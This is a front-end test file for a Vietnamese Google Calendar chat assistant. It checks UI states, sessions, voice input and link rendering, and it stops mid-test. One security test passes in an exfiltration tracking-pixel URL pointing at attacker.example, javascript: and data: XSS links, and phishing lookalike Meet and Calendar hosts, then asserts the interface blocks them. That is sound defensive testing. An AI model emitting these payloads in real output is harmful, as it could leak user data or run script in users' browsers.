import { act, cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';
import { useState } from 'react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { Message } from 'ai';
import type { Dispatch, SetStateAction } from 'react';
import {
  createNewSession,
  deleteSessionById,
  getActiveSessionId,
  loadAllSessions,
  saveCurrentSession,
} from '@/lib/chat/session-storage';
import { ChatInterface } from '../ChatInterface';

interface SpeechResultEvent {
  resultIndex: number;
  results: Array<{ 0: { transcript: string }; isFinal: boolean }>;
}

class MockSpeechRecognition {
  static instances: MockSpeechRecognition[] = [];
  continuous = false;
  interimResults = false;
  lang = '';
  onstart: (() => void) | null = null;
  onend: (() => void) | null = null;
  onerror: ((event: { error: string }) => void) | null = null;
  onresult: ((event: SpeechResultEvent) => void) | null = null;
  start = vi.fn();
  stop = vi.fn();
  abort = vi.fn();

  constructor() {
    MockSpeechRecognition.instances.push(this);
  }
}

const speechResult = (transcripts: string[], resultIndex = 0): SpeechResultEvent => ({
  resultIndex,
  results: transcripts.map((transcript) => ({ 0: { transcript }, isFinal: true })),
});

const getMicrophone = () => screen.getByRole('button', { name: 'Nói để đặt lịch' });
const getComposer = () => screen.getByRole('textbox');
const getRecognition = () => MockSpeechRecognition.instances.at(-1)!;

// Mock ai/react useChat hook
const mockUseChat = vi.fn();
vi.mock('ai/react', () => ({
  useChat: (options: unknown) => ({ stop: vi.fn(), ...mockUseChat(options) }),
}));

describe('ChatInterface Component UX & States', () => {
  afterEach(() => {
    cleanup();
    vi.restoreAllMocks();
  });

  it('renders helpful fallback with retry button when assistant message is empty and error occurs', () => {
    const mockReload = vi.fn();
    mockUseChat.mockReturnValue({
      messages: [
        { id: '1', role: 'user', content: 'Xem các cuộc họp sắp tới của tôi' },
        { id: '2', role: 'assistant', content: '' },
      ],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: false,
      error: new Error('Mạng bị gián đoạn'),
      reload: mockReload,
      setInput: vi.fn(),
    });

    render(<ChatInterface isAuthenticated={true} />);

    expect(
      screen.getByText('Chưa nhận được phản hồi từ trợ lý AI.')
    ).toBeInTheDocument();

    const retryBtns = screen.getAllByRole('button', { name: 'Thử lại' });
    expect(retryBtns.length).toBeGreaterThan(0);
    fireEvent.click(retryBtns[0]);
    expect(mockReload).toHaveBeenCalled();
  });

  it('renders single unified thinking state when assistant message is loading', () => {
    mockUseChat.mockReturnValue({
      messages: [
        { id: '1', role: 'user', content: 'Xem các cuộc họp sắp tới của tôi' },
        { id: '2', role: 'assistant', content: '' },
      ],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: true,
      error: undefined,
      reload: vi.fn(),
      setInput: vi.fn(),
      setMessages: vi.fn(),
    });

    render(<ChatInterface isAuthenticated={true} />);

    expect(screen.getByText('Calendai đang suy nghĩ...')).toBeInTheDocument();
    // Ensure no redundant duplicate banner
    expect(
      screen.queryByText('Calendai đang chuẩn bị phản hồi...')
    ).not.toBeInTheDocument();
  });

  it('renders pending thinking state when message just submitted and assistant not yet added', () => {
    mockUseChat.mockReturnValue({
      messages: [
        { id: '1', role: 'user', content: 'Xem các cuộc họp sắp tới của tôi' },
      ],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: true,
      error: undefined,
      reload: vi.fn(),
      setInput: vi.fn(),
      setMessages: vi.fn(),
    });

    render(<ChatInterface isAuthenticated={true} />);

    expect(screen.getByText('Calendai đang suy nghĩ...')).toBeInTheDocument();
    expect(
      screen.queryByText('Calendai đang chuẩn bị phản hồi...')
    ).not.toBeInTheDocument();
  });

  it('renders markdown formatting like bold text and bullet points properly', () => {
    mockUseChat.mockReturnValue({
      messages: [
        {
          id: '1',
          role: 'assistant',
          content: 'Dưới đây là thông tin:\n* **Tiêu đề**: Họp Sprint\n* **Thời gian**: 09:00',
        },
      ],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: false,
      error: undefined,
      reload: vi.fn(),
      setInput: vi.fn(),
      setMessages: vi.fn(),
    });

    const { container } = render(<ChatInterface isAuthenticated={true} />);

    // Bold elements in message bubbles are parsed as <strong> tags
    const strongElements = container.querySelectorAll('.break-words strong');
    expect(strongElements.length).toBe(2);
    expect(strongElements[0].textContent).toBe('Tiêu đề');
    expect(strongElements[1].textContent).toBe('Thời gian');

    // Bullet points in message bubbles are parsed as <ul> and <li> tags
    const listElements = container.querySelectorAll('.break-words li');
    expect(listElements.length).toBe(2);
  });

  it('blocks remote Markdown images and restricts Markdown links to safe https and mailto URLs', () => {
    mockUseChat.mockReturnValue({
      messages: [
        {
          id: 'msg-md-sec',
          role: 'assistant',
          content: [
            'Tóm tắt lịch hẹn:',
            '![Tracking Pixel](https://attacker.example/exfil?email=victim@example.com)',
            '* [JS](javascript:alert(1))',
            '* [Data](data:text/html,<script>alert(1)</script>)',
            '* [HTTP](http://insecure.example/login)',
            '* [Creds](https://user:pass@example.com/private)',
            '* [Tài liệu](https://docs.example.com/agenda)',
            '* [Liên hệ](mailto:partner@company.com)',
          ].join('\n'),
        },
      ],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: false,
      error: undefined,
      reload: vi.fn(),
      setInput: vi.fn(),
      setMessages: vi.fn(),
    });

    const { container } = render(<ChatInterface isAuthenticated={true} />);

    expect(container.querySelectorAll('img')).toHaveLength(0);
    expect(screen.getByText('JS').closest('a')).toBeNull();
    expect(screen.getByText('Data').closest('a')).toBeNull();
    expect(screen.getByText('HTTP').closest('a')).toBeNull();
    expect(screen.getByText('Creds').closest('a')).toBeNull();

    const safeHttpsLink = screen.getByRole('link', { name: 'Tài liệu' });
    expect(safeHttpsLink).toHaveAttribute('href', 'https://docs.example.com/agenda');
    expect(safeHttpsLink).toHaveAttribute('rel', 'noopener noreferrer');

    const safeMailtoLink = screen.getByRole('link', { name: 'Liên hệ' });
    expect(safeMailtoLink).toHaveAttribute('href', 'mailto:partner@company.com');
  });

  it('renders Meet button in listUpcomingEvents only for verified https://meet.google.com URLs without credentials', () => {
    mockUseChat.mockReturnValue({
      messages: [
        {
          id: 'msg-upcoming-sec',
          role: 'assistant',
          content: '',
          toolInvocations: [
            {
              toolCallId: 'call-upcoming-1',
              toolName: 'listUpcomingEvents',
              state: 'result',
              args: { range: 'upcoming' },
              result: {
                success: true,
                events: [
                  {
                    id: 'evt-phish',
                    summary: 'Lời mời giả mạo',
                    start: '2026-11-25T09:00:00+07:00',
                    hangoutLink: 'https://meet.google.com.evil.test/phish',
                    htmlLink: 'https://calendar.google.com/event?eid=1',
                  },
                  {
                    id: 'evt-http',
                    summary: 'Liên kết HTTP',
                    start: '2026-11-25T10:00:00+07:00',
                    hangoutLink: 'http://phishing.example/meet',
                    htmlLink: 'https://calendar.google.com/event?eid=2',
                  },
                  {
                    id: 'evt-creds',
                    summary: 'Liên kết chứa user:pass',
                    start: '2026-11-25T11:00:00+07:00',
                    hangoutLink: 'https://user:pass@meet.google.com/abc-defg-hij',
                    htmlLink: 'https://calendar.google.com/event?eid=3',
                  },
                  {
                    id: 'evt-js',
                    summary: 'Liên kết javascript',
                    start: '2026-11-25T12:00:00+07:00',
                    hangoutLink: 'javascript:alert(1)',
                    htmlLink: 'https://calendar.google.com/event?eid=4',
                  },
                  {
                    id: 'evt-valid',
                    summary: 'Họp chính thức',
                    start: '2026-11-25T14:00:00+07:00',
                    hangoutLink: 'https://meet.google.com/abc-defg-hij',
                    htmlLink: 'https://calendar.google.com/event?eid=5',
                  },
                ],
              },
            },
          ],
        },
      ],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: false,
      error: undefined,
      reload: vi.fn(),
      setInput: vi.fn(),
      setMessages: vi.fn(),
    });

    render(<ChatInterface isAuthenticated={true} />);

    expect(screen.getByText('Lời mời giả mạo')).toBeInTheDocument();
    expect(screen.getByText('Họp chính thức')).toBeInTheDocument();

    const meetLinks = screen.getAllByRole('link', { name: /Meet/i });
    expect(meetLinks).toHaveLength(1);
    expect(meetLinks[0]).toHaveAttribute('href', 'https://meet.google.com/abc-defg-hij');
  });

  it('renders clear session button when messages exist and calls onClearSession on click', () => {
    const mockSetMessages = vi.fn();
    const mockClearSession = vi.fn();
    mockUseChat.mockReturnValue({
      messages: [
        { id: '1', role: 'user', content: 'Họp lúc 14h' },
      ],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: false,
      error: undefined,
      reload: vi.fn(),
      setInput: vi.fn(),
      setMessages: mockSetMessages,
    });

    render(<ChatInterface isAuthenticated={true} onClearSession={mockClearSession} />);

    const clearBtns = screen.getAllByTitle(/Xóa session/i);
    expect(clearBtns.length).toBeGreaterThan(0);

    fireEvent.click(clearBtns[0]);
    expect(mockSetMessages).not.toHaveBeenCalledWith([]);
    expect(mockClearSession).toHaveBeenCalled();
  });

  it('calls stop on unmount and on activeSessionId switch, without calling stop on unstable rerender or initial session adoption', () => {
    const stop = vi.fn();
    mockUseChat.mockImplementation(() => ({
      messages: [{ id: '1', role: 'user', content: 'Xin chào' }],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: true,
      error: undefined,
      reload: vi.fn(),
      setInput: vi.fn(),
      setMessages: vi.fn(),
      stop: (...args: unknown[]) => stop(...args),
    }));

    const { rerender, unmount } = render(
      <ChatInterface isAuthenticated={true} activeSessionId={null} isTipsOpen={false} />
    );

    // Rerendering with a new stop identity or adopting the generated session ID must not stop the stream.
    rerender(<ChatInterface isAuthenticated={true} activeSessionId={null} isTipsOpen={true} />);
    const adoptedId = loadAllSessions('guest')[0]?.id ?? null;
    expect(adoptedId).not.toBeNull();
    rerender(<ChatInterface isAuthenticated={true} activeSessionId={adoptedId} isTipsOpen={true} />);
    expect(stop).not.toHaveBeenCalled();

    // Switching to another session via props stops the stream once.
    rerender(<ChatInterface isAuthenticated={true} activeSessionId="other-session" isTipsOpen={true} />);
    expect(stop).toHaveBeenCalledTimes(1);

    // Unmounting stops the stream.
    unmount();
    expect(stop).toHaveBeenCalledTimes(2);
  });

  it('does not render a user model selector and calls useChat without body.model', () => {
    mockUseChat.mockReturnValue({
      messages: [],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: false,
      error: undefined,
      reload: vi.fn(),
      setInput: vi.fn(),
      setMessages: vi.fn(),
    });

    render(<ChatInterface isAuthenticated={true} />);

    expect(screen.queryByRole('button', { name: /Chọn mô hình AI/ })).not.toBeInTheDocument();
    expect(mockUseChat).toHaveBeenCalledWith({ api: '/api/chat' });
  });

  it('shows tool loading spinners only while the last message is actively streaming, and shows incomplete Vietnamese notice once stopped or reloaded from localStorage', () => {
    localStorage.clear();
    const savedSession = createNewSession('guest');
    saveCurrentSession(
      {
        ...savedSession,
        title: 'Hội thoại bị ngắt',
        messages: [
          { id: 'u1', role: 'user', content: 'Đặt lịch và xem lịch hôm nay' },
          {
            id: 'a1',
            role: 'assistant',
            content: '',
            toolInvocations: [
              {
                state: 'call',
                toolCallId: 'call-propose',
                toolName: 'proposeMeeting',
                args: { summary: 'Họp dự án' },
              },
              {
                state: 'partial-call',
                toolCallId: 'call-upcoming',
                toolName: 'listUpcomingEvents',
                args: { range: 'today' },
              },
            ],
          },
        ],
      },
      'guest'
    );

    let loading = false;
    let setHookMessages!: Dispatch<SetStateAction<Message[]>>;
    mockUseChat.mockImplementation(() => {
      const [messages, setMessages] = useState<Message[]>([]);
      setHookMessages = setMessages;
      return {
        messages,
        setMessages,
        input: '',
        handleInputChange: vi.fn(),
        handleSubmit: vi.fn(),
        isLoading: loading,
        error: undefined,
        reload: vi.fn(),
        setInput: vi.fn(),
        stop: vi.fn(),
      };
    });

    // 1. Hydrated from localStorage with isLoading === false -> must NOT show infinite spinners
    const { container, rerender } = render(
      <ChatInterface isAuthenticated={true} activeSessionId={savedSession.id} />
    );

    expect(
      screen.queryByText('Đang chuẩn bị thẻ xem trước Google Calendar...')
    ).not.toBeInTheDocument();
    expect(
      screen.queryByText('Đang tra cứu Google Calendar...')
    ).not.toBeInTheDocument();
    expect(container.querySelector('.animate-spin')).toBeNull();
    expect(
      screen.getByText('Chưa hoàn tất tạo bản thảo cuộc họp.')
    ).toBeInTheDocument();
    expect(
      screen.getByText('Chưa hoàn tất tải dữ liệu lịch.')
    ).toBeInTheDocument();
    expect(
      screen.getAllByText('Hãy nhắn yêu cầu lại để trợ lý tiếp tục.')
    ).toHaveLength(2);

    // 2. While actively streaming on the last message (isLoading && isLast) -> shows loading spinners
    loading = true;
    rerender(<ChatInterface isAuthenticated={true} activeSessionId={savedSession.id} />);
    expect(
      screen.getByText('Đang chuẩn bị thẻ xem trước Google Calendar...')
    ).toBeInTheDocument();
    expect(
      screen.getByText('Đang tra cứu Google Calendar...')
    ).toBeInTheDocument();
    expect(
      screen.queryByText('Chưa hoàn tất tạo bản thảo cuộc họp.')
    ).not.toBeInTheDocument();

    // 3. When a newer user message is appended and isLoading is true, the older interrupted message (isLast === false) stays incomplete rather than spinning again
    act(() => {
      setHookMessages((prev) => [
        ...prev,
        { id: 'u2', role: 'user', content: 'Đặt lại giúp tôi lúc 10h' },
      ]);
    });
    expect(
      screen.queryByText('Đang chuẩn bị thẻ xem trước Google Calendar...')
    ).not.toBeInTheDocument();
    expect(
      screen.queryByText('Đang tra cứu Google Calendar...')
    ).not.toBeInTheDocument();
    expect(
      screen.getByText('Chưa hoàn tất tạo bản thảo cuộc họp.')
    ).toBeInTheDocument();
    expect(
      screen.getByText('Chưa hoàn tất tải dữ liệu lịch.')
    ).toBeInTheDocument();
  });
});

describe('ChatInterface session hydration and persistence guards', () => {
  beforeEach(() => localStorage.clear());

  afterEach(() => {
    cleanup();
    localStorage.clear();
    vi.restoreAllMocks();
  });

  it('does not re-persist on unchanged hydration, overwrite a newer active session, or resurrect a deleted session', () => {
    const s1 = createNewSession('user_A');
    saveCurrentSession({
      ...s1,
      title: 'Phiên cũ',
      messages: [{ id: 'm1', role: 'user', content: 'Tin nhắn cũ' }],
    }, 'user_A');

    let setHookMessages!: Dispatch<SetStateAction<Message[]>>;
    mockUseChat.mockImplementation(() => {
      const [messages, setMessages] = useState<Message[]>([]);
      setHookMessages = setMessages;
      return {
        messages,
        setMessages,
        input: '',
        handleInputChange: vi.fn(),
        handleSubmit: vi.fn(),
        isLoading: false,
        error: undefined,
        reload: vi.fn(),
        setInput: vi.fn(),
        stop: vi.fn(),
      };
    });

    const onSessionsChange = vi.fn();
    render(
      <ChatInterface
        isAuthenticated
        historyScope="user_A"
        activeSessionId={s1.id}
        onSessionsChange={onSessionsChange}
      />
    );

    // Unchanged hydration must not trigger redundant session persistence.
    expect(onSessionsChange).not.toHaveBeenCalled();

    // Switching active session in storage before s1 updates must not revert activeSessionId.
    const s2 = createNewSession('user_A');
    expect(getActiveSessionId('user_A')).toBe(s2.id);

    act(() => {
      setHookMessages((prev) => [...prev, { id: 'm2', role: 'assistant', content: 'Phản hồi mới' }]);
    });
    expect(getActiveSessionId('user_A')).toBe(s2.id);
    expect(loadAllSessions('user_A').find((s) => s.id === s1.id)?.messages).toHaveLength(2);

    // Deleting s1 must prevent subsequent updates of s1 from resurrecting it.
    deleteSessionById(s1.id, 'user_A');
    act(() => {
      setHookMessages((prev) => [...prev, { id: 'm3', role: 'user', content: 'Tin nhắn sau khi xóa' }]);
    });
    expect(loadAllSessions('user_A').find((s) => s.id === s1.id)).toBeUndefined();
    expect(getActiveSessionId('user_A')).toBe(s2.id);
  });
});

describe('ChatInterface meeting confirmations', () => {
  beforeEach(() => localStorage.clear());

  afterEach(() => {
    cleanup();
    localStorage.clear();
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it.each([0, 1])('confirms only the selected proposal at index %i in the same message', async (selectedIndex) => {
    const proposals = [
      {
        proposalId: 'proposal-1',
        summary: 'Họp nhóm',
        startDateTime: '2026-11-02T09:00:00+07:00',
        endDateTime: '2026-11-02T10:00:00+07:00',
      },
      {
        proposalId: 'proposal-2',
        summary: 'Họp đối tác',
        startDateTime: '2026-11-02T14:00:00+07:00',
        endDateTime: '2026-11-02T15:00:00+07:00',
      },
    ];
    mockUseChat.mockReturnValue({
      messages: [{
        id: 'two-proposals',
        role: 'assistant',
        content: '',
        toolInvocations: proposals.map((proposal) => ({
          toolCallId: proposal.proposalId,
          toolName: 'proposeMeeting',
          state: 'result',
          args: {},
          result: proposal,
        })),
      }],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: false,
      reload: vi.fn(),
      setInput: vi.fn(),
      setMessages: vi.fn(),
    });
    const fetchMock = vi.fn().mockImplementation(async (_url: string, options: RequestInit) => {
      const proposal = JSON.parse(options.body as string);
      return {
        ok: true,
        json: async () => ({
          success: true,
          event: {
            id: `event-${proposal.proposalId}`,
            summary: proposal.summary,
            start: proposal.startDateTime,
            end: proposal.endDateTime,
            timeZone: 'Asia/Ho_Chi_Minh',
          },
        }),
      };
    });
    vi.stubGlobal('fetch', fetchMock);

    render(<ChatInterface isAuthenticated />);
    const proposalList = screen.getByRole('list', { name: 'Các cuộc họp đề xuất' });
    expect(proposalList.children).toHaveLength(2);
    expect(screen.queryByText('Google Calendar • Bản xem trước vé họp')).not.toBeInTheDocument();
    fireEvent.click(screen.getAllByRole('button', { name: 'Google Meet (Đang tắt) Không tạo Meet' })[selectedIndex]);
    fireEvent.click(screen.getAllByRole('button', { name: 'Xác nhận tạo lịch' })[selectedIndex]);

    expect(await screen.findAllByText('Đã tạo sự kiện thành công!')).toHaveLength(1);
    expect(proposalList.children).toHaveLength(2);
    expect(screen.getAllByText('Chờ xác nhận')).toHaveLength(1);
    expect(screen.getAllByRole('button', { name: 'Xác nhận tạo lịch' })).toHaveLength(1);
    expect(screen.getAllByText(proposals[0].summary)).toHaveLength(1);
    expect(screen.getAllByText(proposals[1].summary)).toHaveLength(1);
    expect(fetchMock).toHaveBeenCalledTimes(1);
    expect(JSON.parse(fetchMock.mock.calls[0][1].body).proposalId).toBe(proposals[selectedIndex].proposalId);
    expect(JSON.parse(fetchMock.mock.calls[0][1].body).createMeet).toBe(true);

    fireEvent.click(screen.getByRole('button', { name: 'Xác nhận tạo lịch' }));

    await waitFor(() => expect(screen.getAllByText('Đã tạo sự kiện thành công!')).toHaveLength(2));
    expect(screen.queryByRole('button', { name: 'Xác nhận tạo lịch' })).not.toBeInTheDocument();
    expect(fetchMock).toHaveBeenCalledTimes(2);
    expect(JSON.parse(fetchMock.mock.calls[1][1].body).proposalId).toBe(proposals[1 - selectedIndex].proposalId);
    expect(JSON.parse(fetchMock.mock.calls[1][1].body).createMeet).toBe(false);
  });
});

describe('ChatInterface voice recognition', () => {
  let isLoading: boolean;
  let messages: Message[];
  let setInput: Dispatch<SetStateAction<string>>;
  const handleSubmit = vi.fn();
  const setMessages = vi.fn();

  beforeEach(() => {
    localStorage.clear();
    isLoading = false;
    messages = [];
    MockSpeechRecognition.instances = [];
    vi.stubGlobal('SpeechRecognition', MockSpeechRecognition);
    vi.stubGlobal('webkitSpeechRecognition', undefined);
    handleSubmit.mockReset();
    setMessages.mockReset();
    mockUseChat.mockImplementation(() => {
      const [input, updateInput] = useState('');
      setInput = updateInput;
      return {
        input,
        messages,
        isLoading,
        setInput: updateInput,
        setMessages,
        handleInputChange: (event: React.ChangeEvent<HTMLTextAreaElement>) => updateInput(event.target.value),
        handleSubmit,
        reload: vi.fn(),
      };
    });
  });

  afterEach(() => {
    cleanup();
    localStorage.clear();
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it('allows stopping while start is pending without spawning another recognizer', () => {
    render(<ChatInterface isAuthenticated />);
    fireEvent.click(getMicrophone());
    const recognition = getRecognition();

    fireEvent.click(screen.getByRole('button', { name: 'Dừng nhận diện giọng nói' }));
    expect(recognition.stop).toHaveBeenCalledOnce();
    fireEvent.click(screen.getByRole('button', { name: 'Dừng nhận diện giọng nói' }));
    expect(MockSpeechRecognition.instances).toHaveLength(1);

    act(() => recognition.onend?.());
    fireEvent.click(getMicrophone());
    expect(MockSpeechRecognition.instances).toHaveLength(2);
  });

  it('appends all newly finalized results without replaying previous batches', () => {
    render(<ChatInterface isAuthenticated />);
    act(() => setInput('Lịch hẹn'));
    fireEvent.click(getMicrophone());
    const recognition = getRecognition();

    act(() => recognition.onresult?.(speechResult(['sáng mai', 'lúc chín giờ'])));
    expect(getComposer()).toHaveValue('Lịch hẹn sáng mai lúc chín giờ');

    act(() => recognition.onresult?.(speechResult(['sáng mai', 'lúc chín giờ', 'có Google Meet'], 2)));
    expect(getComposer()).toHaveValue('Lịch hẹn sáng mai lúc chín giờ có Google Meet');
  });

  it('ignores interim results while accepting later final transcripts', () => {
    render(<ChatInterface isAuthenticated />);
    fireEvent.click(getMicrophone());
    const recognition = getRecognition();
    act(() => recognition.onresult?.({
      resultIndex: 0,
      results: [{ 0: { transcript: 'chưa hoàn tất' }, isFinal: false }],
    }));
    expect(getComposer()).toHaveValue('');
    act(() => recognition.onresult?.(speechResult(['Họp sáng mai'])));
    expect(getComposer()).toHaveValue('Họp sáng mai');
  });

  it('keeps final results delivered after stopping, then releases the recognizer', () => {
    render(<ChatInterface isAuthenticated />);
    fireEvent.click(getMicrophone());
    const recognition = getRecognition();
    act(() => recognition.onstart?.());
    fireEvent.click(screen.getByRole('button', { name: 'Dừng nhận diện giọng nói' }));
    act(() => recognition.onresult?.(speechResult(['Họp sáng mai'])));
    expect(getComposer()).toHaveValue('Họp sáng mai');
    act(() => recognition.onend?.());
    expect(recognition.onresult).toBeNull();
    expect(getMicrophone()).toBeEnabled();
  });

  it.each<[string, RegExp]>([
    ['not-allowed', /cấp quyền truy cập micro/i],
    ['audio-capture', /không tìm thấy micro/i],
    ['no-speech', /chưa nghe rõ giọng nói/i],
    ['network', /kết nối mạng/i],
    ['service-not-allowed', /không hỗ trợ nhận diện giọng nói/i],
  ])('reports %s failures and allows a clean retry', (error, message) => {
    render(<ChatInterface isAuthenticated />);
    fireEvent.click(getMicrophone());
    const recognition = getRecognition();
    const staleResult = recognition.onresult;
    act(() => recognition.onerror?.({ error }));

    expect(screen.getByRole('alert')).toHaveTextContent(message);
    expect(recognition.abort).toHaveBeenCalledOnce();
    expect(recognition.onresult).toBeNull();
    fireEvent.click(getMicrophone());
    expect(screen.queryByRole('alert')).not.toBeInTheDocument();
    act(() => staleResult?.(speechResult(['không được thêm'])));
    expect(getComposer()).toHaveValue('');
    expect(MockSpeechRecognition.instances).toHaveLength(2);
  });

  it('handles a synchronous start failure and releases resources before retry', () => {
    render(<ChatInterface isAuthenticated />);
    // Configure the constructor to return an instance whose native start fails.
    const recognition = new MockSpeechRecognition();
    recognition.start.mockImplementation(() => { throw new Error('start failed'); });
    vi.stubGlobal('SpeechRecognition', class {
      constructor() { return recognition; }
    });
    fireEvent.click(getMicrophone());
    expect(screen.getByRole('alert')).toHaveTextContent(/không thể bắt đầu/i);
    expect(recognition.abort).toHaveBeenCalledOnce();
    expect(recognition.onresult).toBeNull();
  });

  it('contains a synchronous stop failure and lets the user retry', () => {
    render(<ChatInterface isAuthenticated />);
    fireEvent.click(getMicrophone());
    const recognition = getRecognition();
    recognition.stop.mockImplementation(() => { throw new Error('stop failed'); });
    expect(() => fireEvent.click(screen.getByRole('button', { name: 'Dừng nhận diện giọng nói' }))).not.toThrow();
    expect(recognition.abort).toHaveBeenCalledOnce();
    expect(screen.getByRole('alert')).toHaveTextContent(/không thể dừng/i);
    expect(getMicrophone()).toBeEnabled();
  });

  it('aborts and ignores queued callbacks after unmount', () => {
    const { unmount } = render(<ChatInterface isAuthenticated />);
    fireEvent.click(getMicrophone());
    const recognition = getRecognition();
    const staleResult = recognition.onresult;
    unmount();
    expect(recognition.abort).toHaveBeenCalledOnce();
    expect(recognition.onstart).toBeNull();
    expect(recognition.onend).toBeNull();
    expect(recognition.onerror).toBeNull();
    expect(recognition.onresult).toBeNull();
    expect(() => staleResult?.(speechResult(['kết quả muộn']))).not.toThrow();
  });

  it.each(['button', 'keyboard'])('cancels recording before submitting with the %s', (method) => {
    render(<ChatInterface isAuthenticated />);
    act(() => setInput('Họp lúc chín giờ'));
    fireEvent.click(getMicrophone());
    const recognition = getRecognition();
    const staleResult = recognition.onresult;
    if (method === 'button') {
      fireEvent.click(screen.getByRole('button', { name: 'Gửi tin nhắn' }));
    } else {
      fireEvent.keyDown(getComposer(), { key: 'Enter' });
    }
    expect(handleSubmit).toHaveBeenCalledOnce();
    expect(recognition.abort).toHaveBeenCalledOnce();
    act(() => staleResult?.(speechResult(['không gửi thêm'])));
    expect(getComposer()).toHaveValue('Họp lúc chín giờ');
  });

  it('cancels recording when loading starts and disables microphone until loading ends', () => {
    const { rerender } = render(<ChatInterface isAuthenticated />);
    fireEvent.click(getMicrophone());
    const recognition = getRecognition();
    isLoading = true;
    rerender(<ChatInterface isAuthenticated />);
    expect(recognition.abort).toHaveBeenCalledOnce();
    expect(getMicrophone()).toBeDisabled();
    isLoading = false;
    rerender(<ChatInterface isAuthenticated />);
    expect(getMicrophone()).toBeEnabled();
  });

  it('cancels recording when switching chat sessions', () => {
    const { rerender } = render(<ChatInterface isAuthenticated activeSessionId="first" />);
    fireEvent.click(getMicrophone());
    const recognition = getRecognition();
    const staleResult = recognition.onresult;
    rerender(<ChatInterface isAuthenticated activeSessionId="second" />);
    expect(recognition.abort).toHaveBeenCalledOnce();
    act(() => staleResult?.(speechResult(['nội dung hội thoại cũ'])));
    expect(getComposer()).toHaveValue('');
  });

  it('cancels recording when clearing the chat', () => {
    messages = [{ id: '1', role: 'user', content: 'Xin chào' }];
    render(<ChatInterface isAuthenticated />);
    fireEvent.click(getMicrophone());
    const recognition = getRecognition();
    fireEvent.click(screen.getByRole('button', { name: 'Xóa session' }));
    expect(recognition.abort).toHaveBeenCalledOnce();
  });

  it('falls back to webkitSpeechRecognition and hides microphone in unsupported browsers', () => {
    vi.stubGlobal('SpeechRecognition', undefined);
    vi.stubGlobal('webkitSpeechRecognition', MockSpeechRecognition);
    const { unmount } = render(<ChatInterface isAuthenticated />);
    fireEvent.click(getMicrophone());
    expect(getRecognition().lang).toBe('vi-VN');
    unmount();
    vi.stubGlobal('webkitSpeechRecognition', undefined);
    render(<ChatInterface isAuthenticated />);
    expect(screen.queryByRole('button', { name: 'Nói để đặt lịch' })).not.toBeInTheDocument();
  });
});

describe('ChatInterface listUpcomingEvents display and malformed tool result guards', () => {
  beforeEach(() => localStorage.clear());

  afterEach(() => {
    cleanup();
    localStorage.clear();
    vi.restoreAllMocks();
  });

  it('renders Vietnam start times, all-day labels without 07:00 shift, and safe Google Calendar links in listUpcomingEvents', () => {
    mockUseChat.mockReturnValue({
      messages: [
        {
          id: 'msg-upcoming-times',
          role: 'assistant',
          content: '',
          toolInvocations: [
            {
              toolCallId: 'call-upcoming-times',
              toolName: 'listUpcomingEvents',
              state: 'result',
              args: { range: 'upcoming' },
              result: {
                success: true,
                events: [
                  {
                    id: 'evt-timed',
                    summary: 'Họp Sprint',
                    start: '2026-11-25T14:30:00+07:00',
                    end: '2026-11-25T15:30:00+07:00',
                    isAllDay: false,
                    hangoutLink: 'https://meet.google.com/abc-defg-hij',
                    htmlLink: 'https://calendar.google.com/calendar/event?eid=timed1',
                  },
                  {
                    id: 'evt-utc',
                    summary: 'Đồng bộ thiết kế',
                    start: '2026-11-25T09:15:00Z',
                    end: '2026-11-25T10:00:00Z',
                    isAllDay: false,
                    htmlLink: 'https://www.google.com/calendar/event?eid=utc1',
                  },
                  {
                    id: 'evt-allday',
                    summary: 'Nghỉ lễ công ty',
                    start: '2026-11-26',
                    end: '2026-11-27',
                    isAllDay: true,
                    htmlLink: 'https://calendar.google.com.evil.test/phish',
                  },
                ],
              },
            },
          ],
        },
      ],
      input: '',
      handleInputChange: vi.fn(),
      handleSubmit: vi.fn(),
      isLoading: false,
      error: undefined,
      reload: vi.fn(),
      setInput: vi.fn(),
      setMessages: vi.fn(),
    });

    render(<ChatInterface isAuthenticated={true} />);

    expect(screen.getByText('Sự kiện sắp diễn ra trên Google Calendar:')).toBeInTheDocument();
    expect(screen.getByText('Họp Sprint')).toBeInTheDocument();
    expect(screen.getByText('14:30 Thứ 4, 25/11')).toBeInTheDocument();
    expect(screen.getByText('Đồng bộ thiết kế')).toBeInTheDocument();
    expect(screen.getByText('16:15 Thứ 4, 25/11')).toBeInTheDocument();
    expect(screen.getByText('Nghỉ lễ công ty')).toBeInTheDocument();
    expect(screen.getByText('Cả ngày · Thứ 5, 26/11')).toBeInTheDocument();
    expect(screen.queryByText(/07:00/)).not.toBeInTheDocument();

    const calendarLinks = screen.getAllByRole('link', { name: 'Mở trên Google Calendar' });
    expect(calendarLinks).toHaveLength(2);
    expect(calendarLinks[0]).toHaveAttribute('href', 'https://calendar.google.com/calendar/event?eid=timed1');
    expect(calendarLinks[0]).toHaveAttribute('target', '_blank');
    expect(calendarLinks[0]).toHaveAttribute('rel', 'noopener noreferrer');
    expect(calendarLinks[1]).toHaveAttribute('href', 'https://www.google.com/calendar/event?eid=utc1');
    expect(calendarLinks[1]).toHaveAttribute('target', '_blank');
    expect(calendarLinks[1]).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it.each([
    {
      name: 'today non-mock',
      args: { range: 'today' },
      result: { success: true, mode: 'google', events: [] },
      expectedHeading: 'Sự kiện hôm nay trên Google Calendar:',
    },
    {
      name: 'this_week non-mock',
      args: { range: 'this_week' },
      result: { success: true, mode: 'google', events: [] },
      expectedHeading: 'Sự kiện tuần này trên Google Calendar:',
    },
    {
      name: 'upcoming mock',
      args: { range: 'upcoming' },
